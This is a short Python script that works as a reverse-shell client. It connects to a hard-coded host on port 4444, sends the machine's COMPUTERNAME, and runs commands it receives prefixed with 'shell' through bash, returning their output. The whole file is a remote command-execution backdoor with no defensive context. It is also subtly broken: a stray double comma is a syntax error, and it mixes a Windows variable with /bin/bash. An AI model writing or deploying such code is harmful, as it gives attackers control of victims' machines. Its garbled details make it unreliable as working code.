import socket, os, subprocess

def connect():
	#os.system('cls')
	global host
	global port
	global s

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	port = 4444
	host = '192.168.0.30'

	try:
		print('[!] Trying To Connect To %s:%s'%(host, port))
		s.connect((host,port))
		print('[*] Connection Established')
		print(str(os.environ['COMPUTERNAME']).encode('utf8'))
		s.send(str(os.environ['COMPUTERNAME']).encode('utf8'))
	except Exception as e:
		print('Could Not Connect: ', e)

def receive():
	receive = s.recv(1024).decode('utf8')
	if receive == 'quit':
		s.close()
	elif receive[0:5] == 'shell':
		proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, , executable='/bin/bash')
		stdout_value = proc2.stdout.read() + proc2.stderr.read()
		args = stdout_value

	else:
		args = 'No Valid Input Given'

	send(args)

def send(args):
	try:
		send = s.send(args.encode('utf8'))
	except AttributeError:
		send = s.send(args)
	receive()

connect()
receive()
s.close()